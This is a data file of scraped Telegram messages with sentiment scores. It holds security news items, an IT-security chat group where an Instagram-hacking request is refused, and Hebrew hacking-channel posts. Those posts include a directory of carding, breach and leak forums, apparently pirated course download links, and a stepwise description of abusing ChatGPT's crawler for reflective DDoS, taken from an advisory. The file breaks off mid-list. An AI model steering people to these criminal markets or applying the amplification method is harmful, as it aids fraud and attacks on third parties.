+A recent wave of cyberattacks has revealed the exploitation of Microsoft Internet Information Services (IIS) servers by threat actors deploying the BadIIS malware. This campaign, attributed to Chinese-speaking groups, leverages IIS vulnerabilities to manipulate search engine optimization (SEO) rankings and distribute malicious content. The attackers have targeted organizations across Asia, including India, Thailand, and Vietnam, […]
+The post Cybercriminals Target IIS Servers to Spread BadIIS Malware (https://gbhackers.com/cybercriminals-target-iis-servers/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.188, 'neu': 0.722, 'pos': 0.09, 'compound': -0.9118}",-0.9118,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-07 19:59:30,"HPE notifies employees of data breach after Russian Office 365 hack
+https://www.bleepingcomputer.com/news/security/hpe-notifies-employees-of-data-breach-after-russian-office-365-hack/
+
+Hewlett Packard Enterprise (HPE) is notifying employees whose data was stolen from the company's Office 365 email environment by Russian state-sponsored hackers in a May 2023 cyberattack. [...]","{'neg': 0.237, 'neu': 0.763, 'pos': 0.0, 'compound': -0.9042}",-0.9042,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+478514542,2025-02-07 19:58:30,"Hackers exploit Cityworks RCE bug to breach Microsoft IIS servers
+https://www.bleepingcomputer.com/news/security/hackers-exploit-cityworks-rce-bug-to-breach-microsoft-iis-servers/
+
+Software vendor Trimble is warning that hackers are exploiting a Cityworks deserialization vulnerability to remotely execute commands on IIS servers and deploy Cobalt Strike beacons for initial network access. [...]","{'neg': 0.299, 'neu': 0.644, 'pos': 0.057, 'compound': -0.9153}",-0.9153,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+604262457,2025-02-07 19:34:02,"Trimble Releases Security Updates to Address a Vulnerability in Cityworks Software
+https://www.cisa.gov/news-events/alerts/2025/02/07/trimble-releases-security-updates-address-vulnerability-cityworks-software
+
+CISA is collaborating with private industry partners to respond to reports of exploitation of a vulnerability (CVE-2025-0994) discovered by Trimble impacting its Cityworks Server AMS (Asset Management System). Trimble has released security updates and an advisory addressing a recently discovered a deserialization vulnerability enabling an external actor to potentially conduct remote code execution (RCE) against a customer’s Microsoft Internet Information Services (IIS) web server. 
+CISA has added CVE-2025-0994 to its Known Exploited Vulnerabilities Catalog (https://www.cisa.gov/known-exploited-vulnerabilities-catalog), based on evidence of active exploitation. 
+
+
+CISA strongly encourages users and administrators to search for indicators of compromise (IOCs) and apply the necessary updates and workarounds. 
+
+
+Review the following article for more information: 
+
+
+
+Trimble Advisory and IOCs for Vulnerability Affecting Cityworks Deployments  (https://learn.assetlifecycle.trimble.com/i/1532182-cityworks-customer-communication-2025-02-05-docx/0?)
+
+
+
+
+The Symantec Threat Hunter team, part of Broadcom, contributed to this guidance. ","{'neg': 0.073, 'neu': 0.778, 'pos': 0.149, 'compound': 0.8779}",0.8779,Israel Cyber Alerts,,"https://www.cisa.gov,https://www.cisa.gov,https://learn.assetlifecycle.trimble.com",,
+604262457,2025-02-07 19:33:02,"CISA Adds One Known Exploited Vulnerability to Catalog
+https://www.cisa.gov/news-events/alerts/2025/02/07/cisa-adds-one-known-exploited-vulnerability-catalog
+
+CISA has added one vulnerability to its Known Exploited Vulnerabilities Catalog (https://www.cisa.gov/known-exploited-vulnerabilities-catalog), based on evidence of active exploitation.
+
+CVE-2025-0994 (https://www.cve.org/CVERecord?id=CVE-2025-0994) Trimble Cityworks Deserialization Vulnerability
+
+These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.
+Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities (https://www.cisa.gov/binding-operational-directive-22-01) established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the BOD 22-01 Fact Sheet (https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf) for more information.
+Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of Catalog vulnerabilities (https://www.cisa.gov/known-exploited-vulnerabilities-catalog) as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the specified criteria (https://www.cisa.gov/known-exploited-vulnerabilities).","{'neg': 0.174, 'neu': 0.689, 'pos': 0.136, 'compound': -0.4588}",-0.4588,Israel Cyber Alerts,,"https://www.cisa.gov,https://www.cisa.gov,https://www.cve.org,https://www.cisa.gov,https://www.cisa.gov,https://www.cisa.gov,https://www.cisa.gov",,
+478514542,2025-02-07 18:00:44,"US health system notifies 882,000 patients of August 2023 breach
+https://www.bleepingcomputer.com/news/security/us-health-system-notifies-882-000-patients-of-august-2023-breach/
+
+Hospital Sisters Health System notified over 882,000 patients that an August 2023 cyberattack led to a data breach that exposed their personal and health information. [...]","{'neg': 0.255, 'neu': 0.745, 'pos': 0.0, 'compound': -0.9062}",-0.9062,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+478514542,2025-02-07 14:44:15,"Hackers Leveraging Image & Video Attachments to Deliver Malware
+https://gbhackers.com/hackers-leveraging-image-video-attachments/
+
+Cybercriminals are increasingly exploiting image and video files to deliver malware, leveraging advanced techniques like steganography and social engineering. These methods allow attackers to embed malicious code within seemingly harmless multimedia files, bypassing traditional security measures and deceiving unsuspecting users. Hackers have used image-based malware to distribute tools like VIP Keylogger and 0bj3ctivity Stealer, which […]
+The post Hackers Leveraging Image & Video Attachments to Deliver Malware (https://gbhackers.com/hackers-leveraging-image-video-attachments/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.222, 'neu': 0.552, 'pos': 0.226, 'compound': -0.667}",-0.667,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-07 14:43:15,"New Scareware Attack Targeting Mobile Users to Deploy Malicious Antivirus Apps
+https://gbhackers.com/new-scareware-attack-targeting-mobile-users/
+
+A new wave of scareware attacks has emerged, targeting unsuspecting mobile users with fake antivirus applications designed to exploit fear and trick victims into downloading malicious software. Scareware, a type of digital fraud, employs social engineering tactics to alarm users with fabricated warnings about security threats, ultimately coercing them into taking risky actions. Scareware: A […]
+The post New Scareware Attack Targeting Mobile Users to Deploy Malicious Antivirus Apps (https://gbhackers.com/new-scareware-attack-targeting-mobile-users/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.298, 'neu': 0.626, 'pos': 0.076, 'compound': -0.9766}",-0.9766,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-07 14:42:14,"Ghidra 11.3 Released – A Major Update to NSA’s Open-Source Tool
+https://gbhackers.com/ghidra-11-3-released-a-major-update/
+
+The National Security Agency (NSA) has officially released Ghidra 11.3, the latest iteration of its open-source software reverse engineering (SRE) framework. Known for its robust capabilities in analyzing compiled code across multiple platforms, including Windows, macOS, and Linux, this release introduces significant enhancements aimed at improving performance and usability for cybersecurity professionals. One of the […]
+The post Ghidra 11.3 Released – A Major Update to NSA’s Open-Source Tool (https://gbhackers.com/ghidra-11-3-released-a-major-update/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.0, 'neu': 0.839, 'pos': 0.161, 'compound': 0.9201}",0.9201,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-07 14:41:14,"Microsoft Sysinternals 0-Day Vulnerability Enables DLL Injection Attacks on Windows
+https://gbhackers.com/microsoft-sysinternals-0-day-vulnerability/
+
+A critical zero-day vulnerability has been discovered in Microsoft Sysinternals tools, posing a serious security threat to IT administrators and developers worldwide. The vulnerability enables attackers to exploit DLL injection techniques to execute malicious code, putting systems at risk of compromise. Despite being disclosed to Microsoft over 90 days ago, the issue remains unresolved, leaving users reliant on manual […]
+The post Microsoft Sysinternals 0-Day Vulnerability Enables DLL Injection Attacks on Windows (https://gbhackers.com/microsoft-sysinternals-0-day-vulnerability/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.24, 'neu': 0.586, 'pos': 0.174, 'compound': -0.891}",-0.891,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-07 14:40:16,"7-Zip 0-Day Flaw Added to CISA’s List of Actively Exploited Vulnerabilities
+https://gbhackers.com/7-zip-0-day-flaw-added-to-cisas-list/
+
+The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a critical 0-day vulnerability affecting the popular file compression utility, 7-Zip, to its Known Exploited Vulnerabilities (KEV) Catalog. The vulnerability, identified as CVE-2025-0411, highlights a severe flaw that allows attackers to bypass the Mark-of-the-Web (MotW) security feature and execute arbitrary code on targeted systems. Details […]
+The post 7-Zip 0-Day Flaw Added to CISA’s List of Actively Exploited Vulnerabilities (https://gbhackers.com/7-zip-0-day-flaw-added-to-cisas-list/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.185, 'neu': 0.612, 'pos': 0.203, 'compound': 0.2732}",0.2732,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-07 11:42:04,"Former Google Engineer Charged for Allegedly Stealing AI Secrets for China
+https://gbhackers.com/former-google-engineer-charged/
+
+A federal grand jury has indicted Linwei Ding, also known as Leon Ding, a former Google software engineer, on four counts of theft of trade secrets. The charges stem from allegations that Ding stole proprietary artificial intelligence (AI) technologies from Google and shared them with companies based in the People’s Republic of China (PRC). According […]
+The post Former Google Engineer Charged for Allegedly Stealing AI Secrets for China (https://gbhackers.com/former-google-engineer-charged/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.118, 'neu': 0.741, 'pos': 0.141, 'compound': 0.3612}",0.3612,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+7450844921,2025-03-03 02:07:55,Who can help me remove the UI from a old door dash table?? I have a kali Linux virtual machine that I can use for hacking it but I can’t get the table to connect to the VM so I can do an ADB,"{'neg': 0.0, 'neu': 0.944, 'pos': 0.056, 'compound': 0.2982}",0.2982,IT Security Talk,,,,
+7120556107,2025-02-22 00:00:00,I need an ethical hacker,"{'neg': 0.0, 'neu': 0.476, 'pos': 0.524, 'compound': 0.5106}",0.5106,IT Security Talk,,,,
+1388539503,2024-12-09 11:07:48,Hlo everyone anyone to help a friend of a hacked WhatsApp account,"{'neg': 0.173, 'neu': 0.449, 'pos': 0.378, 'compound': 0.4939}",0.4939,IT Security Talk,,,,
+196915009,2024-07-20 17:53:48,"I would agree though that if we used the term ""vulnerability"" very loosely then we could apply it to the process of how they interact with their customers machines but again, not really the reason for this channel and thats a loose application.","{'neg': 0.068, 'neu': 0.892, 'pos': 0.04, 'compound': -0.296}",-0.296,IT Security Talk,,,,
+196915009,2024-07-20 17:49:37,"Thats not exactly a vulnerability though. Its a bug in an update they pushed out that bricked many Windows machines with the software installed. 
+
+A vulnerability is more so a backdoor or issue that allows security threats like remote access, priviledge escelation, etc that is present in functioning software/systems.","{'neg': 0.233, 'neu': 0.688, 'pos': 0.079, 'compound': -0.8665}",-0.8665,IT Security Talk,,,,
+5105698209,2024-07-20 17:17:10,"Oops - Crowdstrike just demonstrated a serious vulnerability - directly internet-connected critical systems are updated with neither testing nor a backout plan...
+Of course all those third party sw vendors have equally rigorous protection 🙂","{'neg': 0.157, 'neu': 0.687, 'pos': 0.157, 'compound': 0.25}",0.25,IT Security Talk,,,,
+315255864,2024-07-03 07:10:34,"Hi, can I share online free hackaton info here?","{'neg': 0.0, 'neu': 0.522, 'pos': 0.478, 'compound': 0.6705}",0.6705,IT Security Talk,,,,
+6228342264,2024-04-09 18:01:46,How many (groups) of malware do you know?,"{'neg': 0.364, 'neu': 0.636, 'pos': 0.0, 'compound': -0.6124}",-0.6124,IT Security Talk,,,,
+6911000158,2024-03-27 22:05:38,"Hi need help. Ex hacked my phone and control everything. Like speed connections, orders in Uber driver or Lyft driver, phone always hot and battery dying very fast","{'neg': 0.082, 'neu': 0.76, 'pos': 0.158, 'compound': 0.3612}",0.3612,IT Security Talk,,,,
+196915009,2024-03-26 19:41:16,Where can I share a current Linux exploit? How is this a security channel if I cannot share security issuse that need patching...,"{'neg': 0.149, 'neu': 0.52, 'pos': 0.331, 'compound': 0.4404}",0.4404,IT Security Talk,,,,
+6948590185,2024-01-21 20:05:07,"Hi, I need some basics of IT security and ethical hacking, can someone help giving me a start or giving some tips where and how to start. I want to do it in my spare time and on a self study basis. Thanks","{'neg': 0.0, 'neu': 0.653, 'pos': 0.347, 'compound': 0.9325}",0.9325,IT Security Talk,,,,
+6918733939,2024-01-05 12:33:57,Hey all. I'm new into bug bounty and learning about it. any good resources? currently I'm doing cert from tcm security on practical ethical hacking,"{'neg': 0.0, 'neu': 0.728, 'pos': 0.272, 'compound': 0.802}",0.802,IT Security Talk,,,,
+316031319,2023-12-20 01:09:30,"Hey Hassan, what kind of security incidents do you want to investigate on?
+
+The common tools like Splunk, Tenable, etc. got ai-powered or ai-driven solutions. But I bet thats not what you would expect from AI.
+They can identify anomalies across multiple systems on a huge data base or automatically generate reports for audits quite well. But they cannot detect and respond or fix threats in a way that it could replace an expert or fully automate parts of the incident handling process. They can actually support you and accelerate your work and give you quite good hints where to keep an eye on. 
+
+Tools like appdynamics, datadog, splunk or new relic are often related to AIOps and suggest to you that this is the solution you are looking for. But instead you should have a look at the complete SDLC and focus on the origin of the risks. Build a DevSecOps pipeline which covers the development and the operation of the code/software which you operate or try to protect. Don’t let security be an afterthought. 
+
+- Copilot can support you in checking your code 
+- Veracode helps you identify and fix your code (SAST, DAST, SCA)
+- Snyk covers the SAST part 
+- tenable takes the vulnerability management part 
+- and the tools mentioned at the beginning are usually monitoring tools at the end of the Pipeline / Lifecycle.
+
+Try to cover all aspects and focus on a shift-left security strategy to reduce the noise at the end.","{'neg': 0.023, 'neu': 0.806, 'pos': 0.17, 'compound': 0.989}",0.989,IT Security Talk,,,,
+609517172,2023-11-11 03:33:34,"Another one bites the dust...!
+Banned [Ydtyyyy4567](tg://user?id=867093320).
+Reason:
+We don’t help with illegal hacking","{'neg': 0.335, 'neu': 0.534, 'pos': 0.131, 'compound': -0.636}",-0.636,IT Security Talk,,,,
+90412883,2023-11-11 03:33:33,/ban We don’t help with illegal hacking,"{'neg': 0.319, 'neu': 0.442, 'pos': 0.239, 'compound': -0.2263}",-0.2263,IT Security Talk,,,,
+867093320,2023-11-11 01:31:39,"Hi, I need help hacking an Instagram account immediately, it's urgent, thanks","{'neg': 0.0, 'neu': 0.519, 'pos': 0.481, 'compound': 0.7506}",0.7506,IT Security Talk,,,,
+5042058140,2023-10-27 18:23:16,Hlw...My self Royal Hacker Sourav from India...Nice to meet you all..,"{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,IT Security Talk,,,,
+-1001574796698,2025-02-14 10:01:15,"📖💻 רוצה להרוויח כסף מהאקינג אתי? 
+
+אם עולם הסייבר מסקרן אותך ואתה רוצה להפוך למקצוען בתחום ההאקינג האתי, המדריך ""How to Make a Living Hacking Computers"" הוא בדיוק מה שאתה צריך! 📚🚀
+
+📌 מה תלמד מהמדריך?
+🔹 מה עושה האקר מקצועי ביום-יום?
+🔹 איך לפתח את כישורי התכנות שלך כדי להיות האקר טוב יותר?
+🔹 איך לתרגל האקינג אתי בצורה חוקית ובטוחה?
+🔹 אילו טכנולוגיות כל האקרים חייבים להכיר?
+🔹 איך למצוא עבודה בתחום ואיך לשווק את עצמך כהאקר אתי?
+
+👨‍💻 למי זה מתאים?
+✔️ מתכנתים שרוצים להיכנס לעולם ההאקינג
+✔️ חובבי סייבר שרוצים להפוך את זה למקצוע מכניס
+✔️ מי שרוצה להבין איך מערכות מאובטחות (או נפרצות) בעולם הדיגיטלי
+
+#סייבר #האקינג_אתי #ביטחון_מידע #קריירה_בסייבר #פריצת_מערכות #תכנות #ethicalhacking #cybersecurity #hackinglife 🚀💻🔐
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://t.me,https://t.me",,
+-1001574796698,2025-02-04 14:44:29,"📢 **התקפת DDoS עם ChatGPT**
+
+נראה כי הסורק של ChatGPT מאפשר שליחת בקשות מרובות למיקוד דרך נקודת הקצה
+/backend-api/attributions, עקב היעדר מניעת כפילויות והגבלת כתובות URL ב-API.
+**
+🛡 שיטת התקפה אפשרית:**
+1️⃣ תוקף שולח בקשה אחת ל-API של ChatGPT עם רשימה ארוכה של כתובות URL כפולות.
+2️⃣ הסורק של ChatGPT יוזם אוטומטית בקשות מקבילות לכל הכתובות האלו.
+3️⃣ נוצרת הגברת התקפה (amplification effect) – בקשת התקפה אחת מובילה לעשרות ואף מאות בקשות סורק.
+4️⃣ הבקשות נשלחות מכתובות IP לגיטימיות של Microsoft Azure, מה שמקשה על זיהוי וחסימה.
+
+⚠️** למה זה מסוכן?**
+
+אפשר לנצל זאת לביצוע התקפות DDoS עקיפות נגד שרתים ויעדים שונים.
+הבקשות נראות ""אמינות"" כי הן מגיעות מתשתית של Microsoft.
+קשה לזהות את מקור ההתקפה האמיתי.
+
+[מקור](https://github.com/bf/security-advisories/blob/main/2025-01-ChatGPT-Crawler-Reflective-DDOS-Vulnerability.md)
+ 
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://github.com,https://t.me,https://t.me",,
+-1001574796698,2025-01-28 06:44:23,"**Loxs - Multi Vulnerability Scanner ** 
+
+https://github.com/coffinxp/loxs/tree/main
+
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 0.82, 'pos': 0.18, 'compound': 0.5093}",0.5093,ICD,,"https://github.com,https://t.me,https://t.me",,
+-1001574796698,2025-01-27 20:20:33,"💻 Adaptix – פתרון מתקדם לבודקי חולשות! 🔐
+
+אם אתם עוסקים בבדיקות חדירות (Penetration Testing) או מחפשים כלי חזק עבור תהליכי Post-Exploitation וסימולציות אדוורסריות, Adaptix הוא בדיוק מה שאתם צריכים. 🚀
+
+✨ מה זה Adaptix? זוהי פלטפורמה גמישה שנבנתה במיוחד עבור אנשי מקצוע בתחום אבטחת המידע.
+Adaptix מאפשרת לבצע תהליכי תקיפה מדויקים, סימולציות מתקדמות, ויכולת להרחיב את המערכת בהתאמה אישית לצרכים שלכם.
+
+📌 למה Adaptix?
+
+כלי רב עוצמה לבדיקות אחרי חדירה (Post-Exploitation)
+פלטפורמה פתוחה להרחבות מותאמות אישית
+מתוכננת עבור תרחישי תקיפה מתקדמים
+🔧 מיועד למי? אנשי מקצוע בתחום אבטחת המידע, בודקי חדירות, ויועצי סייבר שרוצים לשדרג את היכולות שלהם ולהתאים את הכלים לצרכים ייחודיים.
+
+**📎 **[לפרטים נוספים והורדה](https://adaptix-framework.gitbook.io/adaptix-framework/adaptix-c2/getting-starting/installation)
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://adaptix-framework.gitbook.io,https://t.me,https://t.me",,
+-1001574796698,2025-01-27 20:08:11,"רוסטיסלב פאנב, בן 51, אזרח רוסי וישראלי, נעצר בישראל על פי בקשת מעצר  של ארה""ב במטרה להסגרה לארה""ב. פאנב נמצא כעת במעצר בישראל עד להסגרה בגין היותו מפתח של קבוצת תוכנות הכופר LockBit.
+
+למקור: https://www.justice.gov/opa/pr/united-states-charges-dual-russian-and-israeli-national-developer-lockbit-ransomware-group","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,https://www.justice.gov,,
+-1001574796698,2024-12-16 08:37:17,"**🚨 The Malcore Malware Bible 🚨**
+
+ספר  ייחודי שנוצר במיוחד כדי להדריך אותך במסע לעולם המרתק (והמסוכן) של המאלוור.
+אם מטרתך היא להבין, לשלוט או לשלוט לחלוטין באמנות האפלה הזו – הספר הזה יעניקלך את הידע האסור שנוצר במעמקי האש. 🔥
+
+זכור:
+""כדי לנצח את אויבך, צעד בצל מחשבותיו, ותן למוחו להפוך לשלך."" 🧠💻
+
+📖 זה לא רק ספר – זהו מפתח לעולם נסתר.
+
+⚔️ לנועזים בלבד.
+**
+לקריאה והורדה:** https://bible.malcore.io/
+
+#CyberSecurity #EthicalHacking #Malware
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.052, 'neu': 0.948, 'pos': 0.0, 'compound': -0.6476}",-0.6476,ICD,,"https://bible.malcore.io,https://t.me,https://t.me",,
+-1001574796698,2024-12-07 19:20:39,"🛠 **WPExploitScanner**
+ כלי לסריקה, איתור וניצול פגיעויות באתרי וורדפרס.
+
+🔗 https://github.com/00xk0uR1i/k0URI
+
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8
+
+♻️שתפו את הערוץ שלנו ותמכו בנו♻️","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://github.com,https://t.me,https://t.me",,
+-1001574796698,2024-12-04 19:20:45,"DATABASE Forums:
+leakbase.io (Biggest surface database forum)
+ xss.is - (the best)
+ breachforums.st (son of raidforums)
+ cybercarders.com (Biggest cracked accounts Forum)
+ wwh-club.link (Biggest cracket Russian Forum)
+ blackhatworld.com (Similar to cybercarders)
+ Turkhackteam.org (Biggest Blackhat Turkish forum)
+ cdrpro.cc (carding Russia Forum)
+ demonforums.net (Blackhat forum)
+ exploit.in (similar to xss but a little worse)
+ niflheim.top (similar to cybercarders)
+ antimigalki.org (similar to club.link)
+ sinister.ly (similar to demonforums.net)
+ nohide.space (similar to cracked.io)
+ vlmi.top (similar to club.link)
+
+
+
+Telegram Channels:
+ t.me/breachdetector (Tracking all forums to search Data leaks) highly recommended
+ t.me/data1eaks (Reports on the latest Biggest Russian Databases)
+ t.me/bases_for_xss (Group of people from here (xss) exchanging bases)
+ t.me/SpyNet_1984 (Channel Sharing logs of hacking webs)
+ t.me/publiccit0daycollectionfree (city0day Full Collection)
+ t.me/leakbase_official (Official channel of Leakbase Forum sharing exclusive Databases)
+ t.me/leaklogs_official (Official channel of Leakbase Forum sharing exclusive Logs)
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8
+
+♻️שתפו את הערוץ שלנו ותמכו בנו♻️","{'neg': 0.0, 'neu': 0.884, 'pos': 0.116, 'compound': 0.948}",0.948,ICD,,"https://t.me,https://t.me",,
+-1001574796698,2024-11-26 15:49:32,"Uncle Rat'S Web Application Hacking And Bug Bounty Guide
+
+להורדה: 
+https://rapidgator.net/file/bd40569e3396662a74f4311d8f0a7ab5/.Uncle.Rats.Web.Application.Hacking.And.Bug.Bounty.Guide.2023-5.part1.rar
+
+https://rapidgator.net/file/3802ed5d67f2d7cf0913c3e703a41fa1/.Uncle.Rats.Web.Application.Hacking.And.Bug.Bounty.Guide.2023-5.part2.rar
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://rapidgator.net,https://rapidgator.net,https://t.me,https://t.me",,"bd40569e3396662a74f4311d8f0a7ab5,3802ed5d67f2d7cf0913c3e703a41fa1"
+-1001574796698,2024-11-26 15:36:36,"🎞 **TCM Security Academy - Practical API Hacking 2024**
+
+פריצה מעשית ל-API מספקת לך את כל מה שצריך כדי להתחיל לפרוץ ל-APIs. הקורס תוכנן למתחילים ולאלה שמכירים פריצה ליישומי רשת ורוצים להרחיב את סט הכישורים שלהם.
+הקורס מכסה כלים בתקן התעשייה, כגון Burp Suite ו-Postman, ומלמד כיצד למצוא ולנצל פגיעויות נפוצות ביישומים המבוססים על APIs. במהלך הקורס ישנם מעבדות הדגמה שיעזרו לך להבין את התיאוריה, ואתגרים כדי לוודא שתצבור גם ניסיון מעשי.
+
+**דרישות מקדימות**:
+מחשב שיכול להריץ את Kali Linux.
+ידע בסיסי על אופן הפעולה של יישומי רשת.
+
+**מטרות למידה**:
+להבין כיצד APIs פועלים.
+ללמוד כיצד למפות נקודות קצה (endpoints) של API.
+להבין פגיעויות נפוצות ביישומים מונעי API.
+לבצע התקפות מוצלחות על נקודות קצה של API פגיעות.
+
+**להורדה**: 
+https://pixeldrain.com/u/wbiuGrcS
+https://pixeldrain.com/u/Nb5t7ALK
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 0.982, 'pos': 0.018, 'compound': 0.3164}",0.3164,ICD,,"https://pixeldrain.com,https://pixeldrain.com,https://t.me,https://t.me",,
+-1001574796698,2024-11-13 19:11:26,"רשימה מטורפת של דורקים שנלקחו ממקורות שונים כמו גוגל, Shodan, גיטהאב ועוד. הדורקים כוללים גם תוכניות באג באונטי (כולל תוכניות פרטיות), CCTV, CMS, lfi, sqli, xss, ועוד חולשות + יותר ממיליון דורקים. בונוס - דורקים לדארקנט
+
+👉 https://github.com/HackShiv/OneDorkForAll/tree/main/dorks
+
+    https://www.exploit-db.com/google-hacking-database
+    https://elite-google-dorks-search-by-biscuit.vercel.app
+    http://dorkking.blindf.com
+    https://dorksearch.com
+    https://pentestingdorks.netlify.app
+    https://dorkme.com
+    https://dorkgenius.com
+    https://dorks.faisalahmed.me
+    https://taksec.github.io/google-dorks-bug-bounty
+    https://pentest-tools.com/information-gathering/google-hacking
+    https://nitinyadav00.github.io/Bug-Bounty-Search-Engine
+    https://mr-dorker.onrender.com
+    https://dorki.attaxa.com
+    https://github.com/Viralmaniar/BigBountyRecon 
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://github.com,https://www.exploit-db.com,https://elite-google-dorks-search-by-biscuit.vercel.app,http://dorkking.blindf.com,https://dorksearch.com,https://pentestingdorks.netlify.app,https://dorkme.com,https://dorkgenius.com,https://dorks.faisalahmed.me,https://taksec.github.io,https://pentest-tools.com,https://nitinyadav00.github.io,https://mr-dorker.onrender.com,https://dorki.attaxa.com,https://github.com,https://t.me,https://t.me",,
+-1001574796698,2024-10-29 09:27:12,"🔖 אתרים למציאת מידע על חולשות:
+
+  exploit-db.co
+    1337day.com
+    packetstormsecurity.org
+    exploit-id.com
+    exploit-h.org
+    enigmagroup.org
+    wpsecure.net
+    securityfocus.com
+    vulnerability-lab.com
+    exploitsearch.net
+    seclists.org
+    securityreason.com
+    itsecteam.com
+    osvdb.org
+    sebug.net
+    80vul.com
+    allinfosec.com
+    securityhome.eu
+    securiteam.com
+    secunia.com
+    noptrix.net
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://t.me,https://t.me",,
+-1001574796698,2024-10-29 07:36:38,"📺 ערוצי יו טיוב שאתם חייבים להכיר
+
+1. Nahamsec = https://www.youtube.com/channel/UCCZDt7MuC3Hzs6IH4xODLBw/videos
+2. Ebrahim Hegazy =
+https://www.youtube.com/user/Zigoo0/playlists
+3. Ben Grewell =
+https://www.youtube.com/channel/UC2Xz7OF80Ae3SU6uk4ERjZQ/playlists
+4. Bugcrowd =
+https://www.youtube.com/channel/UCo1NHk_bgbAbDBc4JinrXww/playlists
+5. HackerOne = https://www.youtube.com/channel/UCsgzmECky2Q9lQMWzDwMhYw
+6. GynvaelEN =
+https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg
+7. HackerSploit =
+https://www.youtube.com/channel/UC0ZTPkdxlAKf-V33tqXwi3Q
+8. IppSec =
+https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
+9. John Hammond =
